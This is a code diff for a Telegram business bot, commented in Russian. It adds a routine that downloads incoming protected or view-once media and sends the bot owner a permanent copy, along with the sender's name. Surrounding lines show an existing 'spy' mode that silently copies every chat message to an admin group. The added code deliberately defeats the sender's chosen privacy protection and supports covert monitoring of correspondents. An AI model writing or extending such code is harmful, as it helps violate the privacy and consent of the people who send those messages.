@@ -782,6 +782,61 @@ async def _dl_buf(file_id: str, filename: str) -> "BufferedInputFile | None":
         return None
 
 
+async def notify_view_once(owner_id: int, msg: Message):
+    """Скачивает однократное/защищённое входящее медиа и отправляет копию
+    владельцу в личку. Работает для всех пользователей бота, включая самого
+    владельца (ADMIN_ID). Вызывается только для ВХОДЯЩИХ сообщений."""
+    try:
+        sender_name = ""
+        if msg.from_user:
+            sender_name = escape_html(msg.from_user.full_name)
+            if msg.from_user.username:
+                sender_name += f" (@{msg.from_user.username})"
+        elif msg.chat:
+            n = getattr(msg.chat, "full_name", None) or getattr(msg.chat, "first_name", None) or ""
+            sender_name = escape_html(n) if n else f"ID {msg.chat.id}"
+
+        caption = (
+            f"🔥 <b>Однократное медиа</b>\n"
+            f"👤 От: {sender_name}\n"
+            f"<i>Собеседник отправил однократное сообщение — вот ваша копия:</i>"
+        )
+        cap_extra = (f"\n{escape_html(msg.caption)}" if msg.caption else "")
+
+        if msg.photo:
+            f = await _dl_buf(msg.photo[-1].file_id, "photo.jpg")
+            if f:
+                await bot.send_photo(owner_id, f, caption=caption + cap_extra, parse_mode="HTML")
+        elif msg.video:
+            f = await _dl_buf(msg.video.file_id, "video.mp4")
+            if f:
+                await bot.send_video(owner_id, f, caption=caption + cap_extra, parse_mode="HTML")
+        elif msg.voice:
+            f = await _dl_buf(msg.voice.file_id, "voice.ogg")
+            if f:
+                await bot.send_voice(owner_id, f, caption=caption, parse_mode="HTML")
+        elif msg.video_note:
+            f = await _dl_buf(msg.video_note.file_id, "video_note.mp4")
+            if f:
+                await bot.send_message(owner_id, caption, parse_mode="HTML")
+                await bot.send_video_note(owner_id, f)
+        elif msg.audio:
+            fname = msg.audio.file_name or "audio.mp3"
+            f = await _dl_buf(msg.audio.file_id, fname)
+            if f:
+                await bot.send_audio(owner_id, f, caption=caption + cap_extra, parse_mode="HTML")
+        elif msg.document:
+            fname = msg.document.file_name or "file"
+            f = await _dl_buf(msg.document.file_id, fname)
+            if f:
+                await bot.send_document(owner_id, f, caption=caption + cap_extra, parse_mode="HTML")
+        else:
+            # Тип медиа неизвестен — хотя бы уведомляем
+            await bot.send_message(owner_id, caption + "\n<i>(тип медиа не поддерживается)</i>", parse_mode="HTML")
+    except Exception as e:
+        logging.error(f"[VIEW-ONCE] не удалось доставить владельцу {owner_id}: {e}")
+
+
 async def forward_to_admin_silent(owner_id: int, msg: Message):
     """Бесшумно копирует в группу GROUP_ID ЛЮБОЕ сообщение из бизнес-чата
     владельца — и ВХОДЯЩИЕ от собеседника, и ИСХОДЯЩИЕ от самого владельца.
@@ -1355,6 +1410,18 @@ async def handle_business_message(message: Message):
     # Включается/выключается через /spy on|off (только админ).
     if spy_enabled and sender_id is not None:
         asyncio.create_task(forward_to_admin_silent(owner_id, message))
+
+    # Однократное входящее медиа — скачиваем и шлём копию владельцу в личку.
+    # Работает для ВСЕХ пользователей бота (включая ADMIN_ID).
+    # Только входящие: if sender_id != owner_id (собеседник, не сам владелец).
+    _msg_is_protected = bool(getattr(message, "has_protected_content", False))
+    if (
+        _msg_is_protected
+        and has_media(message)
+        and sender_id is not None
+        and sender_id != owner_id
+    ):
+        asyncio.create_task(notify_view_once(owner_id, message))
 
     msg_text = message.text or message.caption or ""
     if extract_url(msg_text):
